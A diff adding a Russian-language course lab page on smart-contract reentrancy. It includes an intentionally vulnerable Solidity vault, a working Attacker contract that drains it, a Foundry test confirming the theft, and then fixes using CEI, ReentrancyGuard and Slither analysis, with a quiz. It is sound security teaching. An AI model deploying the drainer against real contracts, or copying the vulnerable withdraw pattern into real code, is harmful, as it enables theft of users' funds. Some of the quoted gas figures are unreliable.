@@ -1,0 +1,553 @@
+<!doctype html>
+<html lang="ru" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 04 · Reentrancy Attack &amp; Defense — Web3 Genesis</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../../../../css/academy.css" />
+  <link rel="stylesheet" href="../../assets/course.css" />
+</head>
+<body>
+  <div id="site-header"></div>
+
+  <div class="container">
+    <div class="crumbs">
+      <a href="../../../../index.html">Academy</a>
+      <span class="sep">/</span>
+      <a href="../../index.html">Web3 Genesis</a>
+      <span class="sep">/</span>
+      <span>Lab 04 · Reentrancy Attack &amp; Defense</span>
+    </div>
+
+    <p class="lesson-meta">Lab · 04 · security</p>
+    <h1>Lab 04 · Reentrancy Attack &amp; Defense</h1>
+
+    <p>
+      Reentrancy — уязвимость, которая привела к взлому The DAO в 2016 году на 60 млн
+      долларов и остаётся одной из самых частых причин потери средств по сей день. В этой
+      лабораторной работе вы напишете уязвимый контракт, атакуете его в Foundry-тесте,
+      а затем последовательно примените три уровня защиты: CEI-паттерн, ReentrancyGuard
+      и мьютекс для cross-function reentrancy. В финале запустите Slither и сравните
+      отчёты для всех версий.
+    </p>
+
+    <div class="note">
+      <strong>Что вы сделаете:</strong>
+      <ul>
+        <li>Напишете уязвимый EtherVault с <code>withdraw</code>, обновляющим баланс после перевода.</li>
+        <li>Напишете контракт Attacker, дренирующий VaultV1 через reentrancy.</li>
+        <li>Подтвердите атаку в Foundry-тесте: проверите, что весь ETH украден.</li>
+        <li>Исправите контракт по CEI-паттерну (VaultV2).</li>
+        <li>Добавите <code>ReentrancyGuard</code> из OpenZeppelin (VaultV3).</li>
+        <li>Реализуете cross-function reentrancy и защитите его общим мьютексом.</li>
+        <li>Запустите Slither на всех трёх версиях и проанализируете вывод.</li>
+      </ul>
+      <strong>Что сдать:</strong> скриншот Foundry-теста, подтверждающего атаку на VaultV1;
+      отчёт Slither с объяснением каждого найденного предупреждения.
+    </div>
+
+    <h2>Задание 1</h2>
+    <p>
+      Напишите уязвимый контракт <code>src/VaultV1.sol</code>. Уязвимость: баланс
+      обновляется <em>после</em> внешнего вызова (transfer ETH), что позволяет
+      атакующему рекурсивно вызвать <code>withdraw</code> до обновления состояния.
+    </p>
+
+<pre class="code-block"><code>// src/VaultV1.sol — УЯЗВИМЫЙ КОНТРАКТ (намеренно!)
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+/// @notice НЕ ИСПОЛЬЗОВАТЬ В ПРОДАКШНЕ — намеренно уязвимый контракт
+contract VaultV1 {
+    mapping(address => uint256) public balances;
+
+    receive() external payable {}
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    /// @notice УЯЗВИМОСТЬ: внешний вызов происходит ДО обновления состояния
+    function withdraw() external {
+        uint256 amount = balances[msg.sender];
+        require(amount > 0, "Nothing to withdraw");
+
+        // ❌ ПЛОХО: сначала отправляем ETH — это вызывает receive() у атакующего
+        (bool ok, ) = msg.sender.call{value: amount}("");
+        require(ok, "Transfer failed");
+
+        // ❌ ПЛОХО: баланс обнуляется ПОСЛЕ перевода — слишком поздно!
+        balances[msg.sender] = 0;
+    }
+
+    function totalBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}
+</code></pre>
+
+    <p>
+      <strong>Критерий приёмки:</strong> контракт компилируется; вы можете объяснить,
+      в какой именно момент атакующий «вклинивается» в выполнение.
+    </p>
+
+    <h2>Задание 2</h2>
+    <p>
+      Напишите контракт <code>src/Attacker.sol</code>, который использует reentrancy
+      для дренирования VaultV1 в одной транзакции. Атака: <code>deposit</code> 1 ETH,
+      затем <code>withdraw</code>; в <code>receive()</code> снова вызываем <code>withdraw</code>,
+      пока в vault есть ETH.
+    </p>
+
+<pre class="code-block"><code>// src/Attacker.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import "./VaultV1.sol";
+
+contract Attacker {
+    VaultV1 public vault;
+    address public owner;
+
+    constructor(address _vault) {
+        vault  = VaultV1(payable(_vault));
+        owner  = msg.sender;
+    }
+
+    /// @notice Запускает атаку: депозит + первый withdraw
+    function attack() external payable {
+        require(msg.value >= 1 ether, "Need at least 1 ETH");
+        vault.deposit{value: 1 ether}();
+        vault.withdraw();
+    }
+
+    /// @notice Рекурсивный re-enter при получении ETH
+    receive() external payable {
+        // Продолжаем дренировать, пока в vault есть ETH
+        if (address(vault).balance >= 1 ether) {
+            vault.withdraw();
+        }
+    }
+
+    function getBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+
+    function withdraw() external {
+        require(msg.sender == owner);
+        payable(owner).transfer(address(this).balance);
+    }
+}
+</code></pre>
+
+    <p>
+      <strong>Критерий приёмки:</strong> можете нарисовать стек вызовов атаки:
+      attack() → vault.withdraw() → receive() → vault.withdraw() → … → обнуление balance.
+    </p>
+
+    <h2>Задание 3</h2>
+    <p>
+      Напишите Foundry-тест, подтверждающий, что атака успешно дренирует весь ETH
+      из VaultV1. Тест должен: задеплоить vault с депозитами нескольких жертв,
+      запустить атаку и проверить, что баланс vault = 0, а баланс атакующего вырос.
+    </p>
+
+<pre class="code-block"><code>// test/ReentrancyTest.t.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import "forge-std/Test.sol";
+import "../src/VaultV1.sol";
+import "../src/Attacker.sol";
+
+contract ReentrancyTest is Test {
+    VaultV1 vault;
+    Attacker attacker;
+
+    address victim1 = address(0x1);
+    address victim2 = address(0x2);
+    address attackerOwner = address(0x3);
+
+    function setUp() public {
+        vault    = new VaultV1();
+        vm.prank(attackerOwner);
+        attacker = new Attacker(address(vault));
+
+        // Жертвы вносят депозиты
+        vm.deal(victim1, 10 ether);
+        vm.deal(victim2, 10 ether);
+        vm.deal(attackerOwner, 2 ether);
+
+        vm.prank(victim1);
+        vault.deposit{value: 5 ether}();
+
+        vm.prank(victim2);
+        vault.deposit{value: 5 ether}();
+    }
+
+    function test_ReentrancyDrainsVault() public {
+        uint256 vaultBalanceBefore    = address(vault).balance;
+        uint256 attackerBalanceBefore = address(attacker).balance;
+
+        console.log("Vault balance before:", vaultBalanceBefore / 1e18, "ETH");
+        console.log("Attacker balance before:", attackerBalanceBefore / 1e18, "ETH");
+
+        // Запуск атаки
+        vm.prank(attackerOwner);
+        attacker.attack{value: 1 ether}();
+
+        uint256 vaultBalanceAfter    = address(vault).balance;
+        uint256 attackerBalanceAfter = address(attacker).balance;
+
+        console.log("Vault balance after:", vaultBalanceAfter / 1e18, "ETH");
+        console.log("Attacker balance after:", attackerBalanceAfter / 1e18, "ETH");
+
+        // Vault полностью опустошён
+        assertEq(vaultBalanceAfter, 0, "Vault should be drained");
+
+        // Атакующий получил все депозиты жертв + свой 1 ETH
+        assertGt(attackerBalanceAfter, vaultBalanceBefore,
+            "Attacker should have stolen victims ETH");
+    }
+}
+</code></pre>
+
+<pre class="code-block"><code># Запуск с подробным выводом стека вызовов
+forge test --match-test test_ReentrancyDrainsVault -vvvv
+</code></pre>
+
+    <p>
+      <strong>Критерий приёмки:</strong> тест проходит; в trace (<code>-vvvv</code>) видна
+      рекурсия вызовов <code>withdraw()</code>.
+    </p>
+
+    <h2>Задание 4</h2>
+    <p>
+      Исправьте уязвимость по паттерну <strong>CEI (Checks-Effects-Interactions)</strong>:
+      сначала проверки, затем изменение состояния, и только в последнюю очередь
+      внешний вызов. Напишите <code>src/VaultV2.sol</code> и проверьте, что атака
+      больше не работает.
+    </p>
+
+<pre class="code-block"><code>// src/VaultV2.sol — исправлено по CEI
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+contract VaultV2 {
+    mapping(address => uint256) public balances;
+
+    receive() external payable {}
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        // ✅ Checks
+        uint256 amount = balances[msg.sender];
+        require(amount > 0, "Nothing to withdraw");
+
+        // ✅ Effects — обновляем состояние ДО внешнего вызова
+        balances[msg.sender] = 0;
+
+        // ✅ Interactions — внешний вызов в последнюю очередь
+        (bool ok, ) = msg.sender.call{value: amount}("");
+        require(ok, "Transfer failed");
+    }
+
+    function totalBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}
+</code></pre>
+
+<pre class="code-block"><code>// Добавьте в ReentrancyTest.t.sol:
+import "../src/VaultV2.sol";
+
+function test_CEIFixPreventsReentrancy() public {
+    VaultV2 safeVault = new VaultV2();
+    Attacker attackerV2 = new Attacker(payable(address(safeVault)));
+    // Attacker.sol придётся адаптировать под VaultV2-интерфейс
+
+    vm.deal(victim1, 5 ether);
+    vm.prank(victim1);
+    safeVault.deposit{value: 5 ether}();
+
+    vm.deal(attackerOwner, 2 ether);
+    vm.prank(attackerOwner);
+    // Атака должна ревертнуться или украсть только свой 1 ETH
+    attackerV2.attack{value: 1 ether}();
+
+    // Жертвы не потеряли деньги
+    assertEq(safeVault.balances(victim1), 5 ether);
+}
+</code></pre>
+
+    <p>
+      <strong>Критерий приёмки:</strong> тест подтверждает, что VaultV2 защищён:
+      атакующий получает только свой депозит, жертвы не теряют средства.
+    </p>
+
+    <h2>Задание 5</h2>
+    <p>
+      Добавьте защиту через <code>ReentrancyGuard</code> из OpenZeppelin — напишите
+      <code>src/VaultV3.sol</code>. ReentrancyGuard использует storage-флаг,
+      который блокирует рекурсивный вход в <code>nonReentrant</code>-функции.
+    </p>
+
+<pre class="code-block"><code>// src/VaultV3.sol — защищён ReentrancyGuard
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+
+contract VaultV3 is ReentrancyGuard {
+    mapping(address => uint256) public balances;
+
+    receive() external payable {}
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    /// @notice nonReentrant блокирует рекурсивный вход
+    function withdraw() external nonReentrant {
+        uint256 amount = balances[msg.sender];
+        require(amount > 0, "Nothing to withdraw");
+
+        // Здесь порядок CEI тоже соблюдён (defense-in-depth)
+        balances[msg.sender] = 0;
+        (bool ok, ) = msg.sender.call{value: amount}("");
+        require(ok, "Transfer failed");
+    }
+
+    function totalBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}
+</code></pre>
+
+    <p>
+      Изучите реализацию ReentrancyGuard в OpenZeppelin: как флаг <code>_status</code>
+      хранится в storage и почему слот <code>_NOT_ENTERED = 1</code>, а не
+      <code>false = 0</code> (подсказка: gas cost инициализации storage).
+    </p>
+
+    <p>
+      <strong>Критерий приёмки:</strong> тест для VaultV3 аналогично подтверждает
+      защиту; вы можете объяснить, сколько дополнительного газа стоит <code>nonReentrant</code>
+      (~2300 gas на холодный storage slot).
+    </p>
+
+    <h2>Задание 6</h2>
+    <p>
+      Реализуйте <strong>cross-function reentrancy</strong> сценарий: контракт имеет
+      функции <code>withdraw</code> и <code>transfer</code>, обе меняют общий маппинг
+      балансов. Атакующий вклинивается через <code>receive()</code> и вызывает
+      <code>transfer</code>, пока <code>withdraw</code> ещё не обновил баланс.
+      Защитите его общим мьютексом.
+    </p>
+
+<pre class="code-block"><code>// src/CrossFunctionVault.sol — демонстрация cross-function reentrancy
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+
+/// @notice Оба метода используют общий nonReentrant — защита от cross-function атак
+contract CrossFunctionVault is ReentrancyGuard {
+    mapping(address => uint256) public balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    /// @notice nonReentrant блокирует вход в withdraw И transfer одновременно
+    function withdraw(uint256 amount) external nonReentrant {
+        require(balances[msg.sender] >= amount, "Insufficient balance");
+        balances[msg.sender] -= amount;
+        (bool ok, ) = msg.sender.call{value: amount}("");
+        require(ok, "Transfer failed");
+    }
+
+    /// @notice nonReentrant на transfer тоже — один мьютекс на весь контракт
+    function transfer(address to, uint256 amount) external nonReentrant {
+        require(balances[msg.sender] >= amount, "Insufficient balance");
+        balances[msg.sender] -= amount;
+        balances[to]         += amount;
+    }
+}
+</code></pre>
+
+<pre class="code-block"><code>// Напишите тест CrossFunctionAttacker, который пробует:
+// 1. deposit(2 ETH) в CrossFunctionVault
+// 2. withdraw(2 ETH)
+// 3. В receive() пытается вызвать transfer(victim, 2 ETH)
+// Результат: должен получить ReentrancyGuardReentrantCall revert
+</code></pre>
+
+    <p>
+      <strong>Критерий приёмки:</strong> тест подтверждает revert при cross-function
+      reentrancy; в комментарии объяснено, почему CEI на <code>withdraw</code> без
+      <code>nonReentrant</code> на <code>transfer</code> недостаточно.
+    </p>
+
+    <h2>Задание 7</h2>
+    <p>
+      Установите Slither и запустите статический анализ на всех трёх версиях vault.
+      Сравните результаты: VaultV1 должен показать <code>reentrancy-eth</code>;
+      VaultV2 — нет; VaultV3 — нет. Задокументируйте каждое предупреждение.
+    </p>
+
+<pre class="code-block"><code># Установка Slither (требует Python 3.8+)
+pip3 install slither-analyzer
+
+# Анализ каждой версии
+slither src/VaultV1.sol --solc-remaps "@openzeppelin=lib/openzeppelin-contracts" 2>&1 | tee slither-v1.txt
+slither src/VaultV2.sol --solc-remaps "@openzeppelin=lib/openzeppelin-contracts" 2>&1 | tee slither-v2.txt
+slither src/VaultV3.sol --solc-remaps "@openzeppelin=lib/openzeppelin-contracts" 2>&1 | tee slither-v3.txt
+
+# Или все сразу с фильтром по детектору reentrancy
+slither . \
+  --detect reentrancy-eth,reentrancy-no-eth,reentrancy-benign \
+  --solc-remaps "@openzeppelin=lib/openzeppelin-contracts"
+</code></pre>
+
+    <table class="compare">
+      <tr>
+        <th>Версия</th>
+        <th>Ожидаемый детектор</th>
+        <th>Уровень риска</th>
+        <th>Описание</th>
+      </tr>
+      <tr>
+        <td>VaultV1</td>
+        <td><code>reentrancy-eth</code></td>
+        <td>High</td>
+        <td>Внешний вызов до обновления storage — классическая reentrancy</td>
+      </tr>
+      <tr>
+        <td>VaultV2</td>
+        <td>—</td>
+        <td>—</td>
+        <td>CEI паттерн устраняет предупреждение</td>
+      </tr>
+      <tr>
+        <td>VaultV3</td>
+        <td>—</td>
+        <td>—</td>
+        <td>ReentrancyGuard устраняет предупреждение</td>
+      </tr>
+    </table>
+
+    <p>
+      <strong>Критерий приёмки:</strong> приложены файлы <code>slither-v1.txt</code>,
+      <code>slither-v2.txt</code>, <code>slither-v3.txt</code>; в комментарии к
+      каждому предупреждению написано, что оно означает и как исправлено.
+    </p>
+
+    <section class="lesson-quiz" data-lesson="lab-04">
+      <script type="application/json" class="quiz-data">
+{
+  "title": "Самопроверка · Lab 04 · Reentrancy",
+  "intro": "Семь вопросов об атаках reentrancy и методах защиты.",
+  "questions": [
+    {
+      "q": "В чём конкретная уязвимость VaultV1?",
+      "kind": "multiple",
+      "options": [
+        "В функции deposit нет ограничения суммы",
+        "Внешний вызов msg.sender.call происходит до обнуления balances[msg.sender] — атакующий входит обратно раньше, чем баланс обнуляется",
+        "Использование call вместо transfer",
+        "Отсутствие modifier payable на withdraw"
+      ],
+      "answerIndex": 1,
+      "explain": "При вызове withdraw: amount считывается (5 ETH), ETH отправляется → атакующий снова вызывает withdraw → баланс ещё не обнулён, поэтому проверка проходит → ещё 5 ETH. Цикл повторяется до опустошения vault."
+    },
+    {
+      "q": "Что означает паттерн CEI?",
+      "kind": "multiple",
+      "options": [
+        "Compile-Execute-Integrate",
+        "Checks-Effects-Interactions: сначала валидация, затем изменение state, потом внешние вызовы",
+        "Call-Emit-Increment",
+        "Create-Execute-Interact"
+      ],
+      "answerIndex": 1,
+      "explain": "CEI гарантирует, что когда внешний контракт получает управление (в Interactions), все изменения состояния уже выполнены (Effects). Рекурсивный вход найдёт обновлённое состояние и не сможет повторить действие."
+    },
+    {
+      "q": "Почему ReentrancyGuard использует значения 1 и 2 для флага, а не true/false (1 и 0)?",
+      "kind": "multiple",
+      "options": [
+        "Это историческая ошибка, которую не исправляют для обратной совместимости",
+        "Запись нуля в storage возвращает только 200 gas refund, а запись 1→2→1 дешевле чем 0→1→0: холодная запись ненулевого значения стоит 20 000 gas, но изменение ненулевого в ненулевое — только 5 000",
+        "True/false не поддерживаются в Solidity assembly",
+        "Значение 0 зарезервировано для неинициализированных переменных"
+      ],
+      "answerIndex": 1,
+      "explain": "SSTORE 0→nonzero = 20 000 gas (инициализация). SSTORE nonzero→nonzero = 5 000 gas (обновление). Используя 1 (NOT_ENTERED) и 2 (ENTERED), OZ платит только 5 000 gas за вход/выход из nonReentrant вместо 20 000."
+    },
+    {
+      "q": "В чём разница между reentrancy и cross-function reentrancy?",
+      "kind": "multiple",
+      "options": [
+        "В cross-function reentrancy атакующий вызывает ту же самую функцию рекурсивно",
+        "В cross-function reentrancy атакующий во время выполнения функции A вызывает функцию B того же контракта, которая использует то же (ещё не обновлённое) состояние",
+        "Это одно и то же, просто разные названия",
+        "Cross-function reentrancy возможна только через delegatecall"
+      ],
+      "answerIndex": 1,
+      "explain": "Классическая reentrancy = повторный вход в одну функцию. Cross-function = вход в другую функцию с общим состоянием. CEI без nonReentrant на все функции не защищает от cross-function атак."
+    },
+    {
+      "q": "Что происходит с газом при reentrancy-атаке? Может ли атакующий застрять из-за лимита газа?",
+      "kind": "open",
+      "answer": "Каждый рекурсивный вызов потребляет газ. При 10 ETH в vault и минимальном депозите 1 ETH потребуется 10 итераций. Каждый вызов withdraw стоит ~30-50k gas. При gas limit транзакции 21M gas (block limit) атака теоретически упрётся в лимит на очень больших vault'ах. Атакующие либо увеличивают gas limit, либо проводят атаку в несколько шагов, либо выбирают vault'ы с небольшим количеством уникальных депозиторов."
+    },
+    {
+      "q": "Почему <code>transfer()</code> и <code>send()</code> считались защитой от reentrancy, но теперь это не так?",
+      "kind": "multiple",
+      "options": [
+        "Они не поддерживают обратные вызовы",
+        "transfer/send пересылают только 2300 gas получателю — недостаточно для вызова контракта, но после Istanbul/Berlin hard fork стоимость SLOAD/SSTORE изменилась, и 2300 gas больше не гарантирует защиту",
+        "transfer/send автоматически добавляют nonReentrant",
+        "transfer/send используют staticcall, запрещающий изменение state"
+      ],
+      "answerIndex": 1,
+      "explain": "Исторически 2300 gas хватало только на emit события. После EIP-2929 (Berlin, 2021) cold SLOAD стоит 2100 gas — 2300 уже может быть достаточно для некоторых операций. Поэтому transfer/send больше не считаются надёжной защитой; рекомендуется CEI + ReentrancyGuard."
+    },
+    {
+      "q": "Slither нашёл <code>reentrancy-eth (High)</code> в VaultV1. Что нужно сделать, чтобы это предупреждение исчезло?",
+      "kind": "multiple",
+      "options": [
+        "Добавить комментарий // slither-disable-next-line",
+        "Применить CEI-паттерн (обновить state до external call) — или добавить nonReentrant модификатор, или оба",
+        "Заменить call{value} на transfer()",
+        "Перенести контракт на другую сеть"
+      ],
+      "answerIndex": 1,
+      "explain": "Slither анализирует порядок операций: если external call предшествует state write — это reentrancy-eth. Перестановка (CEI) или nonReentrant устраняет условие детектора. Простое добавление комментария — это заглушка, не исправление."
+    }
+  ]
+}
+      </script>
+    </section>
+
+    <div class="attrib">
+      Уязвимые контракты (VaultV1, Attacker) созданы исключительно в образовательных целях.
+      Паттерн reentrancy впервые эксплуатирован в атаке на The DAO (2016, ~3.6M ETH).
+      Slither — статический анализатор от Trail of Bits, открытый исходный код.
+      ReentrancyGuard — OpenZeppelin Contracts v5.
+    </div>
+  </div>
+
+  <div id="site-footer"></div>
+  <script src="../../../../js/header.js"></script>
+  <script src="../../../../js/i18n.js"></script>
+  <script type="module" src="../../assets/quiz.js"></script>
+</body>
+</html>
